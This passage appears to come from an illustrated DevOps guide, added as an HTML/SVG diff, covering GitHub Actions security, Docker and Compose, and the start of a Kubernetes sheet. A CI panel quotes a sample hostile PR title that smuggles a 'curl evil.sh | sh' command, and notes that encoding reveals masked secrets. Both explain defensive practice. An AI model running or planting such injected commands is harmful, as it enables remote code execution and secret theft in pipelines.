+        <text x="680" y="492" class="s-sub" font-size="10.5">pinned: a moved tag does nothing</text>
+        <text x="506" y="514" class="s-sub" font-size="10.5">Dependabot then proposes SHA bumps as reviewable pull requests.</text>
+        <line x1="506" y1="526" x2="914" y2="526" stroke="var(--rule)"/>
+        <text x="506" y="546" class="s-lab" font-size="11">a fork opens a PR titled:</text>
+        <text x="506" y="566" class="s-mono" font-size="10.5" style="fill:var(--hazard)">"; curl evil.sh | sh; #</text>
+        <text x="506" y="586" class="s-sub" font-size="10.5">interpolated into run: it is code · passed through env: it is data</text>
+        <text x="506" y="604" class="s-sub" font-size="10.5">actionlint catches the pattern; the fork's job has no secrets anyway.</text>
+        <text x="506" y="626" class="s-haz" font-size="10.5">Workflow files are production access. Review them like it.</text>
+
+        <rect x="950" y="420" width="420" height="222" fill="var(--band)"/>
+        <text x="966" y="444" class="s-zone" fill="var(--hazard)">15 · who runs your job</text>
+        <text x="966" y="470" class="s-lab" font-size="11">GitHub-hosted</text><text x="1166" y="470" class="s-lab" font-size="11">self-hosted</text>
+        <g class="s-sub" font-size="10.5">
+          <text x="966" y="488">fresh VM every job</text><text x="966" y="502">2 vCPU, 7 GB (free tier)</text><text x="966" y="516">billed per minute, private</text><text x="966" y="530">no private network</text>
+          <text x="1166" y="488">your network, warm caches</text><text x="1166" y="502">no per-minute cost</text><text x="1166" y="516">YOU own isolation,</text><text x="1166" y="530">patching and cleanup</text>
+        </g>
+        <text x="966" y="556" class="s-haz" font-size="10.5">Never a persistent self-hosted runner on a public repo:</text>
+        <text x="966" y="572" class="s-sub" font-size="10.5" style="fill:var(--hazard)">any PR runs code on it and leaves things for the next job.</text>
+        <text x="966" y="598" class="s-lab" font-size="11">masking is not protection</text>
+        <text x="966" y="614" class="s-sub" font-size="10.5">*** hides accidents; base64 or a reversed string prints</text>
+        <text x="966" y="628" class="s-sub" font-size="10.5">the secret in clear. Malicious steps are not accidents.</text>
+
+        <!-- ACCESS LADDER -->
+        <rect x="30" y="660" width="660" height="196" fill="var(--z2)"/>
+        <text x="46" y="684" class="s-zone" fill="var(--mute)">Machine access · best first</text>
+        <rect x="46" y="698" width="36" height="18" fill="var(--line)" opacity=".85"/>
+        <rect x="46" y="726" width="72" height="18" fill="var(--line)" opacity=".6"/>
+        <rect x="46" y="754" width="108" height="18" fill="var(--cool)" opacity=".8"/>
+        <rect x="46" y="782" width="144" height="18" fill="var(--fast)" opacity=".8"/>
+        <rect x="46" y="810" width="180" height="18" fill="var(--hazard)" opacity=".8"/>
+        <g class="s-lab" font-size="11"><text x="240" y="711">1 · OIDC to a cloud role</text><text x="240" y="739">2 · GitHub App, fine-grained</text><text x="240" y="767">3 · fine-grained PAT</text><text x="240" y="795">4 · classic PAT</text><text x="240" y="823">5 · a shared account's password</text></g>
+        <g class="s-sub" font-size="10.5"><text x="480" y="711">no stored secret at all</text><text x="480" y="739">scoped and auditable</text><text x="480" y="767">scoped, expiring</text><text x="480" y="795">broad, long-lived — avoid</text><text x="480" y="823" fill="var(--hazard)">never</text></g>
+        <text x="46" y="846" class="s-sub" font-size="10.5">bar length = what a leaked credential reaches, and for how long · people get access by team, never one by one</text>
+
+        <!-- SPEED -->
+        <rect x="706" y="660" width="664" height="196" fill="var(--z4)"/>
+        <text x="722" y="684" class="s-zone" fill="var(--fast)">16 · twenty minutes to five, in this order</text>
+        <g class="s-lab" font-size="11"><text x="722" y="711">no cache, one big job</text><text x="722" y="739">+ cache dependencies</text><text x="722" y="767">+ shard slow suite ×4</text><text x="722" y="795">+ concurrency</text><text x="722" y="823">+ path filters</text></g>
+        <rect x="930" y="698" width="360" height="18" fill="var(--hazard)" opacity=".7"/>
+        <rect x="930" y="726" width="216" height="18" fill="var(--fast)" opacity=".75"/>
+        <rect x="930" y="754" width="90" height="18" fill="var(--line)" opacity=".8"/>
+        <rect x="930" y="782" width="90" height="18" fill="var(--line)" opacity=".8"/>
+        <g class="s-mono" font-size="10"><text x="1298" y="711">20 min</text><text x="1154" y="739">12 min</text><text x="1028" y="767">5 min</text><text x="1028" y="795">5 min · superseded runs cancelled</text><text x="930" y="823">docs-only change: nothing runs</text></g>
+        <text x="722" y="846" class="s-note" font-size="10.5">Your slowest required check is your delivery cadence. Stop once it is under ten minutes.</text>
+      </svg>
+    </div>
+    <figcaption><b>Read the plan from left to right, then read the bottom half as the attacker would.</b> Every door on the top row is only as strong as its weakest exemption, and every panel below is a way in that does not use a door at all: a workflow with secrets running untrusted code, a tag someone else can move, a runner that remembers the last job.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the rooms, doors and traps</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>PR template</h4><p>Three prompts — what changed, why, how it was verified — turn vague descriptions into useful ones without anybody nagging. The diff already says what; the description must say why.</p></div>
+      <div><h4><span>02</span>CODEOWNERS</h4><p>Routes review automatically by path. Ask one named owner plus a team, not five individuals: diffused responsibility produces slow, shallow reviews.</p></div>
+      <div><h4><span>03</span>A reviewable size</h4><p>Review quality collapses with size. Reviewers find defects in 50 lines and approve 500 on trust. If a change cannot be small, split it into a stack of sequential pull requests.</p></div>
+      <div><h4><span>04</span>Jobs and runners</h4><p>A workflow is YAML in .github/workflows; each job gets a clean runner; jobs run in parallel by default. Split lint, test and build so they fail independently — a handful of jobs, not thirty.</p></div>
+      <div><h4><span>05</span>needs and artifacts</h4><p>needs: sequences jobs. Nothing persists between runners, so files move only as artifacts. The build job runs once everything it depends on is green.</p></div>
+      <div><h4><span>06</span>Read-only token</h4><p>Set permissions: contents: read at the top of every workflow and escalate per job. A compromised step inherits whatever the token can do.</p></div>
+      <div><h4><span>07</span>Concurrency</h4><p>Cancels superseded runs on the same branch, so five outdated pipelines do not finish anyway. Together with the read-only token, the two highest-value lines in any workflow.</p></div>
+      <div><h4><span>08</span>Push protection</h4><p>Secret scanning that rejects a push containing a recognisable credential. It prevents the rotate-and-scrub exercise instead of reporting it afterwards. Turn it on today.</p></div>
+      <div><h4><span>09</span>Branch protection</h4><p>Require a PR, named passing checks, an approval, an up-to-date branch; dismiss stale approvals; block force pushes. And include administrators — the setting people skip. A check that exists but is not required means nothing.</p></div>
+      <div><h4><span>10</span>Environments</h4><p>Scoped secrets, required reviewers and a deployment history for production. The deployment pauses at the door until a named person approves it.</p></div>
+      <div><h4><span>11</span>OIDC</h4><p>The workflow presents a short-lived token that the cloud trusts for one repository and one branch, and gets a one-hour role. It removes the largest class of CI credential risk.</p></div>
+      <div><h4><span>12</span>pull_request_target</h4><p>Runs the base branch's workflow with secrets and a write token in the context of an untrusted fork. Combined with checking out the PR head, it is remote code execution into your repository.</p></div>
+      <div><h4><span>13</span>Pin to a SHA</h4><p>uses: action@v3 is a mutable tag executing inside a job that holds your secrets. A full commit SHA cannot be moved; Dependabot updates pins deliberately. The single most important Actions practice.</p></div>
+      <div><h4><span>14</span>Script injection</h4><p>Interpolating a PR title into run: turns shell metacharacters into commands. Pass untrusted values through env: so they arrive as data, and lint workflows with actionlint.</p></div>
+      <div><h4><span>15</span>Runners</h4><p>Hosted runners are fresh VMs with no network access to you. Self-hosted runners reach internal systems and keep warm caches — and must be ephemeral, never persistent on a public repository.</p></div>
+      <div><h4><span>16</span>Making it fast</h4><p>Cache dependencies, shard the slowest suite, add concurrency, filter by path — in that order, stopping under ten minutes. Job startup is 10–30 s, so do not shard into dozens.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>The pipeline is production</b>
+    <p>It holds credentials, runs third-party code, and its output is trusted by your infrastructure. A compromised pipeline is worse than a compromised server: it ships a backdoor through every control you have, signed off as a normal release. Protect workflow files with the same review as production code, and keep untrusted code away from any job that can see a secret.</p>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 4 — THE SEALED BOX ══════════════════════ -->
+<div class="sheet" id="a4">
+  <div class="plate">
+    <span class="no">Sheet 4</span>
+    <h2>The Sealed Box</h2>
+    <span class="form">Cutaway section</span>
+    <span class="cov">Covers · Docker · Docker Compose</span>
+  </div>
+  <p class="thesis">Stops 09 and 10 of sheet 1, cut open. Namespaces and cgroups already existed; Docker's contribution was the image — a layered, cacheable, shareable filesystem with a one-file build definition. <strong>The artefact is the part that matters: one immutable image, tagged with a commit, that runs the same bytes on a laptop, in CI and in production.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 920" role="img" aria-label="A cutaway of container images and Compose. A, two Dockerfiles drawn as layer stacks: copying source before installing dependencies rebuilds everything on any edit, while copying the package manifest first reuses the dependency layer. B, a multi-stage build: a discarded build stage with compilers and source, and a shipped runtime stage running as a non-root user, beside a bar chart of base image sizes from 1.1 gigabytes down to 5 megabytes. C, a host cut open: three containers above namespace, cgroup and shared kernel bands, compared with a virtual machine. D, a Compose stack on one private network: api and worker reaching postgres and redis by service name, gated by health checks. E, state and configuration outside the container, Compose in CI, and why Compose is a single host.">
+        <defs>
+          <marker id="d1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+        </defs>
+
+        <!-- PANEL A -->
+        <rect x="30" y="50" width="660" height="400" fill="var(--z3)"/>
+        <text x="46" y="74" class="s-zone" fill="var(--mute)">A · layers, and why the order is the whole trick</text>
+        <text x="46" y="94" class="s-sub">Every instruction is a layer, cached by content. A changed layer rebuilds every layer after it.</text>
+        <text x="46" y="120" class="s-num">01</text><text x="70" y="120" class="s-lab" font-size="11" style="fill:var(--hazard)">bad: source copied before dependencies</text>
+        <text x="370" y="120" class="s-lab" font-size="11" style="fill:var(--line)">good: dependencies first</text>
+        <g>
+          <rect x="46" y="130" width="304" height="32" fill="var(--z1)" stroke="var(--line)"/>
+          <rect x="46" y="168" width="304" height="32" fill="var(--z1)" stroke="var(--line)"/>
+          <rect x="46" y="206" width="304" height="32" fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"/>
+          <rect x="46" y="244" width="304" height="32" fill="var(--z5)" stroke="var(--hazard)" stroke-width="2.5"/>
+          <rect x="46" y="282" width="304" height="32" fill="var(--z5)" stroke="var(--hazard)" stroke-width="2.5"/>
+          <rect x="370" y="130" width="304" height="32" fill="var(--z1)" stroke="var(--line)"/>
+          <rect x="370" y="168" width="304" height="32" fill="var(--z1)" stroke="var(--line)"/>
+          <rect x="370" y="206" width="304" height="32" fill="var(--z1)" stroke="var(--line)"/>
+          <rect x="370" y="244" width="304" height="32" fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"/>
+          <rect x="370" y="282" width="304" height="32" fill="var(--z4)" stroke="var(--fast)"/>
+        </g>
+        <g class="s-mono" font-size="10.5">
+          <text x="56" y="150">FROM node:22</text><text x="56" y="188">WORKDIR /app</text><text x="56" y="226">COPY . .</text><text x="56" y="264">RUN npm ci</text><text x="56" y="302">RUN npm run build</text>
+          <text x="380" y="150">FROM node:22</text><text x="380" y="188">COPY package*.json ./</text><text x="380" y="226">RUN npm ci</text><text x="380" y="264">COPY . .</text><text x="380" y="302">RUN npm run build</text>
+        </g>
+        <g class="s-sub" font-size="10.5" text-anchor="end">
+          <text x="340" y="150">cached</text><text x="340" y="188">cached</text><text x="340" y="226" fill="var(--fast)">changed: one file edited</text><text x="340" y="264" fill="var(--hazard)">rebuilt · 90 s</text><text x="340" y="302" fill="var(--hazard)">rebuilt</text>
+          <text x="664" y="150">cached</text><text x="664" y="188">cached</text><text x="664" y="226">cached · 0 s</text><text x="664" y="264" fill="var(--fast)">changed: one file edited</text><text x="664" y="302">rebuilt · seconds</text>
+        </g>
+        <text x="46" y="338" class="s-haz" font-size="11">any source edit: a full 90 s reinstall</text>
+        <text x="370" y="338" class="s-note" font-size="11">any source edit: dependency layer reused</text>
+        <text x="46" y="364" class="s-sub">Order instructions from least to most frequently changed: dependencies change weekly, source hourly.</text>
+        <text x="46" y="380" class="s-sub">The difference is a 2-second or a 2-minute rebuild, on every build, for the life of the project.</text>
+        <text x="46" y="410" class="s-num">02</text><text x="70" y="410" class="s-lab" font-size="11">.dockerignore</text>
+        <text x="170" y="410" class="s-sub" font-size="10.5">keeps .git, node_modules and .env out of the build context entirely</text>
+        <text x="46" y="432" class="s-sub" font-size="10.5">Pin the base by digest, not latest · lint with hadolint · dive shows which layer is bloating the image</text>
+
+        <!-- PANEL B -->
+        <rect x="706" y="50" width="664" height="400" fill="var(--z4)"/>
+        <text x="722" y="74" class="s-zone" fill="var(--fast)">B · multi-stage: what ships, and what stays behind</text>
+        <rect x="722" y="90" width="300" height="210" fill="var(--band)" stroke="var(--mute)" stroke-width="2" stroke-dasharray="7 5"/>
+        <text x="734" y="110" class="s-num">03</text><text x="756" y="110" class="s-lab" font-size="11">stage 1 · FROM node:22 AS build</text>
+        <g class="s-mono" font-size="10" style="fill:var(--mute)"><text x="734" y="134">compiler, SDK, dev dependencies</text><text x="734" y="150">the full source tree and .git</text><text x="734" y="166">npm run build → /app/dist</text><text x="734" y="182">anything used during the build</text></g>
+        <text x="734" y="216" class="s-haz" font-size="10.5">discarded — never pushed,</text>
+        <text x="734" y="230" class="s-haz" font-size="10.5">never pulled, never attacked</text>
+        <text x="734" y="258" class="s-sub" font-size="10.5">A single-stage image carries all of</text>
+        <text x="734" y="272" class="s-sub" font-size="10.5">this into production.</text>
+        <path d="M1024,150 L1058,150" stroke="var(--line)" stroke-width="3" fill="none" marker-end="url(#d1)"/>
+        <rect x="1062" y="90" width="292" height="210" fill="var(--paper)" stroke="var(--line)" stroke-width="2.5"/>
+        <text x="1074" y="110" class="s-num">04</text><text x="1096" y="110" class="s-lab" font-size="11">stage 2 · FROM node:22-slim</text>
+        <g class="s-mono" font-size="10">
+          <text x="1074" y="134">npm ci --omit=dev</text><text x="1074" y="150">COPY --from=build /app/dist</text><text x="1074" y="166">ENV NODE_ENV=production</text>
+          <text x="1074" y="182">USER node  ← non-root</text><text x="1074" y="198">EXPOSE 3000</text><text x="1074" y="214">CMD ["node", "dist/server.js"]</text>
+        </g>
+        <text x="1074" y="242" class="s-note" font-size="11">shipped: 180 MB, no compiler,</text>
+        <text x="1074" y="256" class="s-note" font-size="11">no package manager to abuse</text>
+        <text x="1074" y="280" class="s-sub" font-size="10.5">tagged with the commit sha, signed</text>
+        <text x="722" y="322" class="s-lab" font-size="11">Not an optimisation — a security control.</text>
+        <text x="722" y="338" class="s-sub">Every tool left in the image is a tool an attacker gets after landing in the container.</text>
+        <text x="722" y="360" class="s-num">05</text><text x="746" y="360" class="s-lab" font-size="11">base images</text>
+        <g class="s-mono" font-size="10"><text x="722" y="380">node:22</text><text x="722" y="396">-slim</text><text x="722" y="412">-alpine</text><text x="722" y="428">distroless</text><text x="722" y="444">scratch</text></g>
+        <rect x="800" y="371" width="300" height="11" fill="var(--hazard)" opacity=".7"/>
+        <rect x="800" y="387" width="55" height="11" fill="var(--line)" opacity=".85"/>
+        <rect x="800" y="403" width="36" height="11" fill="var(--fast)" opacity=".8"/>
+        <rect x="800" y="419" width="22" height="11" fill="var(--line)" opacity=".85"/>
+        <rect x="800" y="435" width="3" height="11" fill="var(--line)" opacity=".85"/>
+        <g class="s-sub" font-size="10"><text x="1108" y="380">~1.1 GB · full Debian</text><text x="863" y="396">~200 MB · the sensible default</text><text x="844" y="412" fill="var(--fast)">~130 MB · musl can bite native modules and DNS</text><text x="830" y="428">~80 MB · no shell to land in</text><text x="811" y="444">~5 MB · static binaries only (Go, Rust)</text></g>
+
+        <!-- PANEL C -->
+        <rect x="30" y="470" width="660" height="250" fill="var(--z1)"/>
+        <text x="46" y="494" class="s-zone" fill="var(--line)">C · one kernel, many sealed boxes</text>
+        <rect x="46" y="504" width="400" height="200" fill="var(--paper)" stroke="var(--rule)"/>
+        <g fill="var(--z2)" stroke="var(--line)" stroke-width="2"><rect x="58" y="516" width="120" height="92"/><rect x="188" y="516" width="120" height="92"/><rect x="318" y="516" width="120" height="92"/></g>
+        <g class="s-lab" font-size="11"><text x="68" y="536">container A</text><text x="198" y="536">container B</text><text x="328" y="536">container C</text></g>
+        <g class="s-sub" font-size="10">
+          <text x="68" y="554">non-root USER</text><text x="68" y="568">read-only fs</text><text x="68" y="582">one process</text>
+          <text x="198" y="554">mem + cpu limits</text><text x="198" y="568">health check</text><text x="198" y="582">env vars for config</text>
+          <text x="328" y="554">caps dropped</text><text x="328" y="568">no socket mount</text><text x="328" y="582">no --privileged</text>
+        </g>
+        <rect x="58" y="616" width="380" height="24" fill="var(--z3)"/>
+        <rect x="58" y="644" width="380" height="24" fill="var(--z4)"/>
+        <rect x="58" y="672" width="380" height="24" fill="var(--line)" opacity=".85"/>
+        <text x="68" y="632" class="s-sub" font-size="10.5">06 · namespaces — what each process can SEE</text>
+        <text x="68" y="660" class="s-sub" font-size="10.5">07 · cgroups — how much each can USE</text>
+        <text x="68" y="688" class="s-lab" font-size="11" style="fill:var(--paper)">ONE SHARED HOST KERNEL</text>
+        <text x="462" y="520" class="s-lab" font-size="11">versus a virtual machine</text>
+        <g class="s-lab" font-size="10.5"><text x="462" y="540">VM</text><text x="572" y="540">container</text></g>
+        <g class="s-sub" font-size="10">
+          <text x="462" y="558">gigabytes</text><text x="572" y="558">megabytes</text>
+          <text x="462" y="574">tens of seconds</text><text x="572" y="574">milliseconds</text>
+          <text x="462" y="590">hardware isolation</text><text x="572" y="590">kernel isolation</text>
+          <text x="462" y="606">any OS</text><text x="572" y="606">Linux on Linux</text>
+        </g>
+        <text x="462" y="632" class="s-haz" font-size="10.5">08 · not a VM-strength</text>
+        <text x="462" y="646" class="s-sub" font-size="10.5" style="fill:var(--hazard)">boundary. Untrusted,</text>
+        <text x="462" y="660" class="s-sub" font-size="10.5" style="fill:var(--hazard)">multi-tenant code wants</text>
+        <text x="462" y="674" class="s-sub" font-size="10.5" style="fill:var(--hazard)">a microVM or gVisor.</text>
+
+        <!-- PANEL D -->
+        <rect x="706" y="470" width="664" height="250" fill="var(--z2)"/>
+        <text x="722" y="494" class="s-zone" fill="var(--mute)">D · Compose: the whole stack, one command</text>
+        <rect x="722" y="504" width="632" height="170" fill="var(--paper)" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="6 5"/>
+        <text x="732" y="518" class="s-mono" font-size="9.5" style="fill:var(--line)">compose_default · a private network</text>
+        <g fill="var(--z1)" stroke="var(--line)" stroke-width="2">
+          <rect x="740" y="528" width="120" height="54"/><rect x="740" y="604" width="120" height="54"/>
+          <rect x="1000" y="524" width="170" height="58" stroke-width="2.5"/><rect x="1000" y="604" width="170" height="54"/>
+        </g>
+        <g class="s-lab" font-size="11"><text x="750" y="546">api</text><text x="750" y="622">worker</text><text x="1010" y="542">postgres:5432</text><text x="1010" y="622">redis:6379</text></g>
+        <g class="s-sub" font-size="10">
+          <text x="750" y="560">bind mount .:/app</text><text x="750" y="574">host 3000 → 3000</text>
+          <text x="750" y="640">no ports published</text>
+          <text x="1010" y="558">healthcheck: pg_isready</text><text x="1010" y="572">volume: pgdata</text>
+          <text x="1010" y="640">healthcheck: PING</text>
+        </g>
+        <g stroke="var(--line)" stroke-width="2" fill="none" marker-end="url(#d1)">
+          <path d="M860,552 L996,552"/><path d="M860,570 L996,618"/><path d="M860,631 L996,631"/>
+        </g>
+        <text x="872" y="546" class="s-mono" font-size="9.5" style="fill:var(--line)">by service name</text>
+        <text x="1186" y="538" class="s-num">09</text><text x="1208" y="538" class="s-lab" font-size="11">depends_on</text>
+        <g class="s-sub" font-size="10"><text x="1186" y="556">without a health check,</text><text x="1186" y="570">postgres needs 3 s and</text><text x="1186" y="584">api crashes at start</text></g>
+        <text x="1186" y="604" class="s-note" font-size="10.5">condition:</text>
+        <text x="1186" y="618" class="s-note" font-size="10.5">service_healthy</text>
+        <g class="s-sub" font-size="10"><text x="1186" y="636">and still retry the first</text><text x="1186" y="650">connection in the app</text></g>
+        <text x="722" y="692" class="s-num">10</text><text x="744" y="692" class="s-lab" font-size="11">volumes</text>
+        <text x="806" y="692" class="s-sub" font-size="10.5">named (pgdata): fast, survives down, removed by down -v</text>
+        <text x="806" y="708" class="s-sub" font-size="10.5">bind (.:/app): live reload, slow on macOS — mask /app/node_modules</text>
+
+        <!-- PANEL E -->
+        <rect x="30" y="740" width="1340" height="166" fill="var(--band)"/>
+        <text x="46" y="764" class="s-num">11</text><text x="70" y="764" class="s-lab" font-size="11">stateless and ephemeral</text>
+        <text x="46" y="784" class="s-sub">Anything written inside is gone when the container is replaced.</text>
+        <text x="46" y="798" class="s-sub">State → a volume, a managed database, object storage, a cache.</text>
+        <text x="46" y="812" class="s-sub">Config → environment variables, injected at run time.</text>
+        <text x="46" y="834" class="s-note" font-size="11">One image:&lt;sha&gt;, promoted unchanged everywhere.</text>
+        <text x="46" y="858" class="s-num">14</text><text x="70" y="858" class="s-haz" font-size="10.5">root by default — add USER, drop ALL caps</text>
+        <text x="46" y="874" class="s-sub" font-size="10.5" style="fill:var(--hazard)">never bake a secret: docker history shows every layer</text>
+        <text x="46" y="888" class="s-sub" font-size="10.5" style="fill:var(--hazard)">never mount the Docker socket: it is root on the host</text>
+
+        <text x="490" y="764" class="s-num">12</text><text x="514" y="764" class="s-lab" font-size="11">Compose in CI</text>
+        <g class="s-mono" font-size="10.5"><text x="490" y="786">docker compose up -d --wait</text><text x="490" y="802">docker compose exec -T api npm test</text><text x="490" y="818">docker compose down -v</text></g>
+        <text x="490" y="840" class="s-sub">--wait blocks until every health check passes, so there</text>
+        <text x="490" y="854" class="s-sub">is no sleep that is too slow and too short at once.</text>
+        <text x="490" y="876" class="s-note" font-size="10.5">Testcontainers is often better inside a test suite.</text>
+
+        <text x="930" y="764" class="s-num">13</text><text x="954" y="764" class="s-haz">Compose is one host</text>
+        <text x="930" y="784" class="s-sub">restart: always does not survive the host dying.</text>
+        <text x="930" y="798" class="s-sub">No rolling update, so every deploy is a brief outage.</text>
+        <text x="930" y="812" class="s-sub">No secret management: the file and .env are plaintext.</text>
+        <text x="930" y="834" class="s-note" font-size="11">Fine for an internal tool, if you admit it is one server.</text>
+        <text x="930" y="854" class="s-sub">Availability expected → ECS, a PaaS, or sheet 5.</text>
+        <text x="930" y="876" class="s-sub">Use profiles; fifteen services exhaust a laptop.</text>
+      </svg>
+    </div>
+    <figcaption><b>Two guarantees make the box worth using, and both are easy to throw away.</b> Identical bytes everywhere — lost the moment you build a separate image per environment. A small attack surface — lost to a single-stage build running as root. Compose extends the first guarantee to the whole development stack, which is why it is the best onboarding tool in software and a poor production platform.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the parts of an image and a stack</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>Layer cache</h4><p>Each instruction is cached by content; a changed layer invalidates every later one. COPY . . before npm ci reinstalls all dependencies on any edit — the most common Dockerfile mistake.</p></div>
+      <div><h4><span>02</span>.dockerignore</h4><p>Without it, .git, node_modules and .env are sent into the build context and can end up in a layer. Write it before the first build.</p></div>
+      <div><h4><span>03</span>Build stage</h4><p>Has the compiler, SDK, dev dependencies and source. It produces the build output and is never shipped, so none of it reaches production.</p></div>
+      <div><h4><span>04</span>Runtime stage</h4><p>A slim base, production dependencies, the built output copied from stage 1, a non-root USER. Everything a running service needs and nothing an attacker would like.</p></div>
+      <div><h4><span>05</span>Base image</h4><p>Prefer -slim by default and distroless where you can. Alpine's musl libc causes hard-to-diagnose native-module and DNS problems; the saving is rarely worth the afternoon.</p></div>
+      <div><h4><span>06</span>Namespaces</h4><p>The kernel feature that gives a process its own view of the filesystem, network and process tree. Isolation of what it can see — not a separate kernel.</p></div>
+      <div><h4><span>07</span>cgroups</h4><p>Limits on how much CPU and memory a process may use. The same mechanism an orchestrator uses to enforce requests and limits on sheet 5.</p></div>
+      <div><h4><span>08</span>Container versus VM</h4><p>Megabytes and milliseconds instead of gigabytes and tens of seconds, because the kernel is shared. Which is exactly why a kernel bug can cross the line: use a VM, Firecracker or gVisor for untrusted code.</p></div>
+      <div><h4><span>09</span>depends_on and health</h4><p>Start order is not readiness order. A health check on every stateful service plus condition: service_healthy removes most "Compose is flaky" complaints; the app should still retry.</p></div>
+      <div><h4><span>10</span>Volumes</h4><p>Named volumes for data — fast everywhere, survive down. Bind mounts for live-reloaded source — slow on macOS and Windows. Mask /app/node_modules so the host's build does not hide the container's.</p></div>
+      <div><h4><span>11</span>Stateless container</h4><p>State lives in volumes, managed databases and object storage; configuration comes from the environment. One image promoted unchanged, so rollback is starting the previous tag.</p></div>
+      <div><h4><span>12</span>Compose in CI</h4><p>up -d --wait, run the tests against real services, down -v. The same definition developers use locally, torn down completely afterwards.</p></div>
+      <div><h4><span>13</span>Single host</h4><p>No rescheduling, no rolling updates, no secret management, no autoscaling. A legitimate trade for small internal workloads, as long as nobody pretends it is high availability.</p></div>
+      <div><h4><span>14</span>Container hardening</h4><p>Containers run as root by default. Add a USER, drop capabilities, use a read-only filesystem, never bake secrets into layers, never mount the Docker socket, and rebuild regularly to pick up patches.</p></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 5 — THE THERMOSTAT ══════════════════════ -->
+<div class="sheet" id="a5">
+  <div class="plate">
+    <span class="no">Sheet 5</span>
+    <h2>The Thermostat</h2>
+    <span class="form">Control loop</span>
+    <span class="cov">Covers · Kubernetes · Deployment Strategies</span>
+  </div>
+  <p class="thesis">Where the artefact from sheet 4 actually runs. Kubernetes never starts a container because you asked; you declare that three should exist, and a controller notices whenever that is untrue. <strong>Self-healing, rolling updates, autoscaling and rescheduling are the same loop pointed at different objects — and most mysterious behaviour is a requests, limits or probe setting that the loop is faithfully obeying.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 910" role="img" aria-label="A control loop and a cluster. On the left, the reconciliation loop: declare desired state, observe, compare, act, and back again, forever. On the right, the cluster: a control plane band with api-server, etcd, scheduler and controllers; a nodes band with three nodes, one of them NotReady with its pods being rescheduled and one new pod not yet ready; and a traffic band from the internet through a load balancer, Ingress and Service to ready pods, with a NetworkPolicy that is open by default. In the middle, CPU and memory bars showing throttling above the CPU limit and an OOM kill above the memory limit, and the three probes with what each controls. Along the bottom, a rolling update that stops safely, why Secrets are not secret, and whether you need Kubernetes at all.">
+        <defs>
+          <marker id="k1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+          <marker id="k2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--hazard)"/></marker>
+        </defs>
+
+        <text x="40" y="42" class="s-zone" fill="var(--line)">The loop · you never start a container; you declare that three should exist</text>
+
+        <!-- LOOP -->
+        <rect x="190" y="80" width="200" height="60" fill="var(--z1)" stroke="var(--line)" stroke-width="2.5"/>
+        <rect x="400" y="240" width="160" height="60" fill="var(--z2)" stroke="var(--line)" stroke-width="2.5"/>
+        <rect x="190" y="400" width="200" height="60" fill="var(--z4)" stroke="var(--fast)" stroke-width="2.5"/>
+        <rect x="40" y="240" width="170" height="60" fill="var(--z2)" stroke="var(--line)" stroke-width="2.5"/>
+        <g class="s-lab" font-size="11.5"><text x="202" y="102">01 · desired state</text><text x="412" y="262">02 · observe</text><text x="202" y="422">03 · compare</text><text x="52" y="262">04 · act</text></g>
+        <g class="s-sub" font-size="10.5">
+          <text x="202" y="118">replicas: 3 · app:&lt;sha&gt;</text><text x="202" y="132">written to etcd via the API</text>
+          <text x="412" y="278">2 pods Ready; the third</text><text x="412" y="292">was lost with its node</text>
+          <text x="202" y="438">want 3, have 2 → drift</text><text x="202" y="452">the controller must act</text>
+          <text x="52" y="278">create one pod; the</text><text x="52" y="292">scheduler picks a node</text>
+        </g>
+        <g stroke="var(--line)" stroke-width="3.5" fill="none" marker-end="url(#k1)">
+          <path d="M390,110 C450,110 480,160 480,234"/>
+          <path d="M480,300 C480,380 450,430 396,430"/>
+          <path d="M190,430 C130,430 125,380 125,306"/>
+          <path d="M125,240 C125,160 140,110 184,110"/>
+        </g>
+        <text x="305" y="258" text-anchor="middle" class="s-note" font-size="13">forever</text>
+        <text x="305" y="278" text-anchor="middle" class="s-sub">every controller runs this loop</text>
+        <text x="305" y="292" text-anchor="middle" class="s-sub">for its own kind of object</text>
+        <text x="40" y="492" class="s-sub">Self-healing, rolling updates, autoscaling and rescheduling are all</text>
+        <text x="40" y="506" class="s-sub">this one loop, pointed at different objects.</text>
+        <text x="40" y="530" class="s-haz" font-size="10.5">So kubectl delete pod feels futile: the Deployment simply recreates it.</text>
+
+        <!-- CONTROL PLANE -->
+        <rect x="580" y="56" width="790" height="110" fill="var(--z3)"/>
+        <text x="596" y="78" class="s-zone" fill="var(--mute)">05 · control plane — managed for you on EKS, GKE, AKS</text>
+        <g fill="var(--paper)" stroke="var(--rule)"><rect x="596" y="92" width="170" height="58" stroke="var(--line)" stroke-width="2"/><rect x="780" y="92" width="170" height="58"/><rect x="964" y="92" width="180" height="58"/><rect x="1158" y="92" width="196" height="58"/></g>
+        <g class="s-lab" font-size="11"><text x="606" y="112">api-server</text><text x="790" y="112">etcd</text><text x="974" y="112">scheduler</text><text x="1168" y="112">controllers</text></g>
+        <g class="s-sub" font-size="10.5"><text x="606" y="130">the only way in; Argo CD</text><text x="606" y="143">applies Git here</text><text x="790" y="130">the desired state,</text><text x="790" y="143">stored; encrypt at rest</text><text x="974" y="130">places pods by unreserved</text><text x="974" y="143">CPU and memory requests</text><text x="1168" y="130">the reconciliation loops:</text><text x="1168" y="143">Deployment, ReplicaSet, HPA</text></g>
+
+        <!-- NODES -->
